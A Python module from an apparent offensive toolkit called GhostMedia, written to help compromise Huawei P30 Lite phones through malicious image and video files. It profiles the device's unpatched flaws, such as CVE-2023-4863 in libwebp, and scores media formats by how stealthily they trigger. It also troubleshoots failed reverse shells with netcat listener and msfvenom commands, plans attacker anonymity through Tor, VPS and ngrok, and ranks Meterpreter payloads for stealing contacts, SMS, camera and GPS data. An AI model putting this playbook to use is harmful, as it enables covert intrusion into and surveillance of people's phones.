"""
AI Analyzer Module — Intelligent Diagnostic Engine for GhostMedia
═══════════════════════════════════════════════════════════════════

Self-contained expert system: diagnoses errors, analyzes targets,
recommends attack vectors, tests connectivity, auto-optimizes.
"""

import re
import sys
import platform
import socket
import subprocess
import time
from typing import Dict, List, Optional, Any
from datetime import datetime
from enum import Enum


# ─── Enums ─────────────────────────────────────────────────

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"


class Diagnosis:
    """Single diagnostic result."""
    def __init__(self, issue: str, severity: Severity, cause: str,
                 fix: str, confidence: float = 0.0):
        self.issue = issue
        self.severity = severity
        self.cause = cause
        self.fix = fix
        self.confidence = confidence
        self.timestamp = datetime.now().isoformat()

    def __repr__(self):
        return (f"[{self.severity.value}] {self.issue} "
                f"(confidence: {self.confidence:.0%})")


# ─── Knowledge Base: Error Patterns ────────────────────────

ERROR_PATTERNS = [
    {
        "pattern": r"connection\s*(refused|timed?\s*out|reset)",
        "issue": "Target connection rejected or timed out",
        "severity": Severity.HIGH,
        "cause": ("The reverse connection from target cannot reach "
                  "your listener. Most common failure point."),
        "fix": (
            "1. Verify LHOST is reachable: curl ifconfig.me\n"
            "2. If behind NAT: use ngrok, VPS, or port forwarding\n"
            "3. Check firewall: ufw allow PORT\n"
            "4. Start listener first: nc -lvp PORT or msfconsole -r listener.rc"
        ),
    },
    {
        "pattern": r"(no\s*route\s*to\s*host|network\s*is\s*unreachable|host\s*is\s*down)",
        "issue": "Network route to target/listener unavailable",
        "severity": Severity.CRITICAL,
        "cause": "Network layer failure — IP unreachable or routing broken.",
        "fix": (
            "1. Verify internet: ping 8.8.8.8\n"
            "2. Target carrier may block certain ports → use 80, 443, 8080, 53\n"
            "3. Test proxy independently: curl --proxy socks5://IP:PORT example.com\n"
            "4. Use VPS for reliable public IP"
        ),
    },
    {
        "pattern": r"(execve|exec\s*format\s*error|bad\s*exec|ENOEXEC)",
        "issue": "Shellcode execution failed — architecture mismatch",
        "severity": Severity.HIGH,
        "cause": ("Payload architecture doesn't match target CPU. "
                  "Huawei P30 Lite = Kirin 710 = ARM64 (aarch64)."),
        "fix": (
            "1. Verify arch: adb shell getprop ro.product.cpu.abi\n"
            "2. Use --arch aarch64 --platform android in msfvenom\n"
            "3. GhostMedia defaults to ARM64 for P30 Lite\n"
            "4. Custom shellcode must be compiled for aarch64-linux-android"
        ),
    },
    {
        "pattern": r"(permission\s*denied|EACCES|operation\s*not\s*permitted)",
        "issue": "Permission denied — insufficient privileges",
        "severity": Severity.MEDIUM,
        "cause": "Shellcode executed but tried action requiring root.",
        "fix": (
            "1. Initial shell runs as app's UID — this is EXPECTED\n"
            "2. You have a foothold; now escalate:\n"
            "3. Check: uname -a; cat /proc/version\n"
            "4. Try local exploits: CVE-2019-2215, CVE-2020-0041\n"
        ),
    },
    {
        "pattern": r"(proxy|socks).*?(refused|fail|denied|auth|407|502)",
        "issue": "Proxy connection failed or rejected",
        "severity": Severity.HIGH,
        "cause": "Proxy server dead, requires auth, or blocks target port.",
        "fix": (
            "1. Test proxy: curl --proxy socks5://IP:PORT example.com\n"
            "2. Refresh: --fetch-proxies --min-anonymity HIA\n"
            "3. Use common ports: 80, 443 (some proxies block 4444)\n"
            "4. proxychains4 with strict_chain for resilience"
        ),
    },
    {
        "pattern": r"(resolve|DNS|name\s*resolution|NXDOMAIN|getaddrinfo)",
        "issue": "DNS resolution failed",
        "severity": Severity.LOW,
        "cause": "DNS lookup failure — wrong hostname or DNS blocking.",
        "fix": (
            "1. Use direct IP instead of hostname\n"
            "2. Check: nslookup HOSTNAME 8.8.8.8\n"
            "3. Ngrok addresses change — re-check URL"
        ),
    },
    {
        "pattern": r"(msfvenom|metasploit).*?(not\s*found|command\s*not\s*found)",
        "issue": "Metasploit/msfvenom not installed",
        "severity": Severity.MEDIUM,
        "cause": "msfvenom not in PATH.",
        "fix": (
            "1. Termux: pkg install metasploit\n"
            "2. Linux: sudo apt install metasploit-framework\n"
            "3. GhostMedia has built-in ARM64 stager (no msfvenom needed)"
        ),
    },
    {
        "pattern": r"(ModuleNotFoundError|ImportError|No\s*module\s*named)",
        "issue": "Missing Python dependency",
        "severity": Severity.HIGH,
        "cause": "Required Python module not installed.",
        "fix": "Run: pip install -r requirements.txt  or  bash install.sh",
    },
    {
        "pattern": r"(no\s*space|disk\s*full|ENOSPC)",
        "issue": "Disk full — cannot write output files",
        "severity": Severity.CRITICAL,
        "cause": "Storage exhausted.",
        "fix": "Check: df -h  →  Clean: rm -rf ghostmedia_output_*  →  pkg clean",
    },
    {
        "pattern": r"(SyntaxError|IndentationError)",
        "issue": "Python syntax error",
        "severity": Severity.CRITICAL,
        "cause": "Script corruption from copy-paste or encoding issue.",
        "fix": "Re-download from GitHub. Check: file -i script.py (must be utf-8)",
    },
    {
        "pattern": r"(webp|VP8L|libwebp).*?(invalid|corrupt|malformed|format)",
        "issue": "Generated WebP file rejected as invalid",
        "severity": Severity.MEDIUM,
        "cause": "Exploit WebP fails format validation. Target may be patched.",
        "fix": (
            "1. Try different format: --format png\n"
            "2. Use --heap-spray for reliability\n"
            "3. Verify target libwebp version\n"
        ),
    },
    {
        "pattern": r"(SELinux|avc.*denied)",
        "issue": "SELinux blocking execution",
        "severity": Severity.HIGH,
        "cause": "Android SELinux Enforcing blocking syscalls.",
        "fix": (
            "1. Check: getenforce  (Huawei = Enforcing)\n"
            "2. MediaScanner has permissive-ish context — exploit that\n"
            "3. Use conservative syscalls in shellcode"
        ),
    },
]


# ─── Target Profiles ─────────────────────────────────────

TARGET_PROFILES = {
    "huawei_p30_lite": {
        "name": "Huawei P30 Lite",
        "android": ["9.0", "10.0"],
        "emui": ["9.1", "10.0"],
        "chipset": "Kirin 710",
        "arch": "aarch64",
        "libwebp_version": "1.2.4 - 1.3.1",
        "vulnerabilities": [
            "CVE-2023-4863 (libwebp) — HIGH confidence",
            "CVE-2023-28320 (libpng/Skia) — MEDIUM confidence",
            "Stagefright (multiple CVEs) — MEDIUM confidence",
            "CVE-2019-2215 (kernel binder) — LOW confidence",
        ],
        "defenses": [
            "SELinux Enforcing",
            "ASLR present — bypassable via heap spray",
            "No CFI on Android 9/10",
            "EMUI AppLock (not relevant to media exploits)",
        ],
        "recommended_vectors": ["webp", "png", "mp4", "jpeg"],
        "recommended_ports": [443, 8443, 8080, 4444],
        "notes": (
            "P30 Lite last security patch: mid-2021. "
            "CVE-2023-4863 discovered Sep 2023 — device NEVER patched. "
            "WebP vector is exceptionally reliable for this target."
        ),
    },
}

ATTACK_VECTOR_SCORES = {
    "webp": {
        "base": 85, "auto_trigger": True, "stealth": 90, "reliability": 75,
        "description": ("CVE-2023-4863: libwebp Huffman table overflow. "
                       "Thumbnail generation trigger. Best for P30 Lite."),
    },
    "png": {
        "base": 70, "auto_trigger": True, "stealth": 85, "reliability": 65,
        "description": "PNG chunk manipulation overflow. Gallery thumbnail trigger.",
    },
    "mp4": {
        "base": 60, "auto_trigger": True, "stealth": 40, "reliability": 55,
        "description": "Stagefright-style MP4 atom parsing overflow. MMS trigger.",
    },
    "jpeg": {
        "base": 50, "auto_trigger": True, "stealth": 95, "reliability": 45,
        "description": "JPEG COM marker / EXIF IFD overflow. Very stealthy.",
    },
}


# ─── AI Analyzer ─────────────────────────────────────────

class AIAnalyzer:
    """AI-powered diagnostic and optimization engine."""

    def __init__(self, debug: bool = False):
        self.debug = debug
        self.diagnoses: List[Diagnosis] = []
        self.target_profile = None
        self._load_target("huawei_p30_lite")

    def _load_target(self, target_name: str):
        self.target_profile = TARGET_PROFILES.get(target_name,
                                                   TARGET_PROFILES["huawei_p30_lite"])

    # ─── TARGET ANALYSIS ───────────────────────────────

    def analyze_target(self, target_name: str) -> Dict[str, Any]:
        """Analyze target and score attack vectors."""
        self._load_target(target_name)
        profile = self.target_profile

        scored_vectors = []
        for fmt, data in ATTACK_VECTOR_SCORES.items():
            if fmt not in profile.get("recommended_vectors", []):
                continue

            score = data["base"]
            if data["auto_trigger"]:
                score += 10
            for vuln in profile.get("vulnerabilities", []):
                if fmt.upper() in vuln.upper():
                    score += 15
                    break

            scored_vectors.append({
                "format": fmt, "score": min(score, 100),
                "stealth": data["stealth"], "reliability": data["reliability"],
                "description": data["description"],
            })

        scored_vectors.sort(key=lambda v: v["score"], reverse=True)

        return {
            "target": profile["name"], "chipset": profile["chipset"],
            "architecture": profile["arch"],
            "android_versions": profile["android"],
            "known_vulnerabilities": profile["vulnerabilities"],
            "defenses": profile["defenses"],
            "recommended_vectors": scored_vectors,
            "recommended_ports": profile["recommended_ports"],
            "critical_note": profile["notes"],
            "best_vector": scored_vectors[0] if scored_vectors else None,
        }

    # ─── ERROR DIAGNOSIS ───────────────────────────────

    def diagnose_error(self, error_text: str) -> List[Diagnosis]:
        """Analyze error text and return diagnoses."""
        error_lower = error_text.lower()
        results = []

        for pattern in ERROR_PATTERNS:
            try:
                if re.search(pattern["pattern"], error_lower, re.IGNORECASE):
                    confidence = self._calculate_confidence(error_text, pattern)
                    results.append(Diagnosis(
                        issue=pattern["issue"],
                        severity=pattern["severity"],
                        cause=pattern["cause"],
                        fix=pattern["fix"],
                        confidence=confidence,
                    ))
            except re.error:
                continue

        results.sort(key=lambda d: d.confidence, reverse=True)

        if not results:
            results.append(Diagnosis(
                issue="Unknown error — no known pattern matched",
                severity=Severity.MEDIUM,
                cause="Error doesn't match any pattern in knowledge base.",
                fix=(
                    "1. Share full error for manual analysis\n"
                    "2. Run with --debug flag\n"
                    "3. Check logs in ghostmedia_output_*/\n"
                    "4. Common fix: reinstall deps, check network, verify target"
                ),
                confidence=0.2,
            ))

        self.diagnoses = results
        return results

    def _calculate_confidence(self, error_text: str, pattern: Dict) -> float:
        """Calculate diagnosis confidence score."""
        confidence = 0.6
        error_lower = error_text.lower()
        keywords = re.findall(r'\w+', pattern["pattern"].lower())
        matched = sum(1 for kw in keywords if kw in error_lower)
        if matched >= 3:
            confidence += 0.2
        if matched >= 5:
            confidence += 0.1

        strong = ["connection refused", "timed out", "permission denied",
                  "no route to host", "ModuleNotFoundError", "msfvenom: command"]
        for s in strong:
            if s in error_lower:
                confidence += 0.15
                break

        return min(confidence, 1.0)

    # ─── NETWORK DIAGNOSTICS ───────────────────────────

    def test_connectivity(self, host: str, port: int,
                          timeout: float = 5.0) -> Dict[str, Any]:
        """Test TCP connectivity."""
        result = {"host": host, "port": port, "reachable": False,
                  "latency_ms": None, "error": None, "suggestion": None}

        try:
            start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.close()
            result["reachable"] = True
            result["latency_ms"] = round((time.time() - start) * 1000, 1)
        except socket.timeout:
            result["error"] = "Connection timed out"
            result["suggestion"] = (f"Port {port} on {host} not responding. "
                                    "Check listener and firewall.")
        except ConnectionRefusedError:
            result["error"] = "Connection refused"
            result["suggestion"] = (f"Port {port} closed. Start listener: "
                                    f"nc -lvp {port}")
        except socket.gaierror:
            result["error"] = "DNS resolution failed"
            result["suggestion"] = (f"Cannot resolve '{host}'. Use IP address.")
        except OSError as e:
            result["error"] = f"Network error: {e}"
            result["suggestion"] = "Check internet and firewall rules."

        return result

    def run_full_diagnostics(self, lhost: str = None,
                             lport: int = None) -> Dict[str, Any]:
        """Run comprehensive diagnostics."""
        report = {
            "timestamp": datetime.now().isoformat(),
            "system": {}, "network": {}, "dependencies": {},
            "recommendations": [],
        }

        # System
        report["system"] = {
            "platform": platform.platform(),
            "python": sys.version.split()[0],
            "hostname": socket.gethostname(),
        }

        # Dependencies
        deps = {"python3": "python3 --version", "pip": "pip3 --version",
                "msfvenom": "msfvenom --version", "nc": "nc -h",
                "curl": "curl --version"}
        for name, cmd in deps.items():
            try:
                subprocess.run(cmd.split(), capture_output=True, timeout=5)
                report["dependencies"][name] = "OK"
            except (FileNotFoundError, subprocess.TimeoutExpired):
                report["dependencies"][name] = "MISSING"

        # Listener test
        if lhost and lport:
            report["network"]["listener_test"] = self.test_connectivity(lhost, lport)

        # Internet
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(("8.8.8.8", 53))
            sock.close()
            report["network"]["internet"] = "Connected"
        except Exception as e:
            report["network"]["internet"] = f"No internet: {e}"

        # Public IP
        try:
            from urllib.request import urlopen
            with urlopen("https://ifconfig.me", timeout=5) as r:
                report["network"]["public_ip"] = r.read().decode().strip()
        except Exception:
            report["network"]["public_ip"] = "Could not detect"

        # Recommendations
        recs = report["recommendations"]
        if "MISSING" in report["dependencies"].get("msfvenom", ""):
            recs.append("Install Metasploit: pkg install metasploit")
        if not report["network"].get("internet", "").startswith("Connected"):
            recs.append("No internet connection — check WiFi/data")
        if (lhost and lport and
            not report.get("network", {}).get("listener_test", {}).get("reachable", True)):
            recs.append(f"Port {lport} not reachable — use ngrok or VPS")

        return report

    # ─── STRATEGY SUGGESTIONS ──────────────────────────

    def suggest_proxy_strategy(self, need_stealth: bool = True,
                               need_speed: bool = False) -> Dict[str, Any]:
        """Suggest optimal proxy/network configuration."""
        strategies = []

        if need_stealth and need_speed:
            strategies.append({
                "name": "VPS + Proxychains (balanced)",
                "setup": ("1. Rent VPS ($5/mo)\n"
                         "2. SSH tunnel: ssh -D 9050 -N -f root@VPS_IP\n"
                         "3. proxychains4 ngrok tcp 4444\n"
                         "4. LHOST = ngrok URL"),
                "stealth": 8, "speed": 7, "cost": "$5-10/mo",
            })
        elif need_stealth:
            strategies.append({
                "name": "Tor → VPS → ngrok (maximum stealth)",
                "setup": ("1. proxychains4 ssh root@VPS_IP  # via Tor\n"
                         "2. On VPS: ngrok tcp 4444\n"
                         "3. LHOST = ngrok URL\n"
                         "4. VPS only sees Tor exit node"),
                "stealth": 10, "speed": 3, "cost": "$5-10/mo + Tor",
            })
        elif need_speed:
            strategies.append({
                "name": "Direct VPS (fastest)",
                "setup": ("1. Rent VPS near target\n"
                         "2. Run GhostMedia directly on VPS\n"
                         "3. LHOST = VPS public IP"),
                "stealth": 4, "speed": 10, "cost": "$5/mo",
            })

        strategies.append({
            "name": "ngrok Quick Start (free, simplest)",
            "setup": ("1. pkg install ngrok\n"
                     "2. ngrok tcp 4444\n"
                     "3. LHOST = 0.tcp.ngrok.io, LPORT = assigned"),
            "stealth": 3, "speed": 6, "cost": "Free",
        })

        return {"strategies": strategies, "recommended": strategies[0]}

    def analyze_best_payload(self, target_arch: str = "aarch64",
                             target_android: str = "10",
                             need_stealth: bool = True) -> Dict[str, Any]:
        """Recommend best payload."""
        payloads = [
            {"name": "android/shell/reverse_tcp", "type": "staged",
             "size": "~300B", "reliability": 9, "stealth": 7,
             "features": "Basic reverse shell, very stable",
             "best_for": "Initial foothold"},
            {"name": "android/meterpreter/reverse_tcp", "type": "staged",
             "size": "~50KB", "reliability": 8, "stealth": 5,
             "features": "Meterpreter: contacts, SMS, camera, GPS, filesystem",
             "best_for": "Post-exploitation data collection"},
            {"name": "android/meterpreter_reverse_tcp", "type": "stageless",
             "size": "~200KB", "reliability": 6, "stealth": 3,
             "features": "All-in-one Meterpreter",
             "best_for": "When staging is blocked"},
            {"name": "GhostMedia Built-in Stager", "type": "ARM64 native",
             "size": "~180B", "reliability": 10, "stealth": 10,
             "features": "Pure ARM64 shellcode, no msfvenom needed",
             "best_for": "Maximum stealth, no Metasploit"},
        ]

        return {
            "target_arch": target_arch, "target_android": target_android,
            "payloads": payloads,
            "recommended": payloads[3] if need_stealth else payloads[0],
            "note": ("For P30 Lite: start with Built-in Stager for stealth. "
                    "Upgrade to Meterpreter after foothold."),
        }

    # ─── FORMATTED OUTPUT ──────────────────────────────

    def print_diagnosis_report(self, diagnosis: Diagnosis):
        """Pretty-print diagnosis."""
        colors = {Severity.CRITICAL: "\033[91m", Severity.HIGH: "\033[93m",
                  Severity.MEDIUM: "\033[94m", Severity.LOW: "\033[96m",
                  Severity.INFO: "\033[92m"}
        c = colors.get(diagnosis.severity, "\033[0m")
        r = "\033[0m"

        print(f"\n{c}╔══ {diagnosis.severity.value} "
              f"| Confidence: {diagnosis.confidence:.0%} ══╗{r}")
        print(f"{c}║ Issue : {diagnosis.issue}{r}")
        print(f"{c}║ Cause : {diagnosis.cause}{r}")
        print(f"{c}╠══ FIX ═══════════════════════════╣{r}")
        for line in diagnosis.fix.split("\n"):
            print(f"{c}║ {line}{r}")
        print(f"{c}╚{'═' * 40}╝{r}\n")

    def print_target_analysis(self, analysis: Dict[str, Any]):
        """Pretty-print target analysis."""
        c = "\033[96m"; r = "\033[0m"
        print(f"""
{c}╔══════════════════════════════════════════════════╗
║  TARGET ANALYSIS                                  ║
╠════════════════════════════════════════════════════╣
║ Device : {analysis['target']:<42} ║
║ CPU    : {analysis['chipset']:<42} ║
║ Arch   : {analysis['architecture']:<42} ║
║ Android: {', '.join(analysis['android_versions']):<42} ║
╠════════════════════════════════════════════════════╣
║ KNOWN VULNERABILITIES:                            ║{r}""")
        for v in analysis["known_vulnerabilities"]:
            print(f"{c}║  • {v:<45} ║{r}")
        print(f"""{c}╠════════════════════════════════════════════════════╣
║ DEFENSES:                                         ║{r}""")
        for d in analysis["defenses"]:
            print(f"{c}║  • {d:<45} ║{r}")
        print(f"""{c}╠════════════════════════════════════════════════════╣
║ RECOMMENDED VECTORS (scored):                     ║{r}""")
        for v in analysis["recommended_vectors"]:
            bar = "█" * (v["score"] // 5)
            print(f"{c}║  {v['format']:6s} [{bar:<15s}] {v['score']}/100           ║{r}")
        note = analysis['critical_note'][:47]
        print(f"""{c}╠════════════════════════════════════════════════════╣
║ ⚠ {note} ║
╚════════════════════════════════════════════════════╝{r}
""")


# ─── Quick Functions ──────────────────────────────────────

def quick_diagnose(error_text: str) -> List[Diagnosis]:
    """One-shot diagnostic."""
    return AIAnalyzer(debug=False).diagnose_error(error_text)


def quick_target_analysis(target: str = "huawei_p30_lite") -> Dict:
    """One-shot target analysis."""
    return AIAnalyzer().analyze_target(target)
